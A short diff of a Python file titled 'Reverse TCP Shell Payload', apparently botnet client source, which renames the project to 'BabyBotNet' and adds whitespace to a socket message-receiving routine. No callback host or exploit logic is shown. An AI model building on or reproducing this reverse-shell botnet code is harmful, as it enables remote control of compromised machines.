@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Reverse TCP Shell Payload (Build Your Own Botnet)'
+'Reverse TCP Shell Payload (BabyBotNet)'
 
 # standard library
 import os
@@ -1125,7 +1125,7 @@ class Payload():
         """
         try:
             hdr_len = struct.calcsize('!L')
-            hdr = self.connection.recv(hdr_len)
+            hdr = self.connection.recv(hdr_len)             
             if len(hdr) == 4:
                 msg_len = struct.unpack('!L', hdr)[0]
                 msg = self.connection.recv(msg_len)
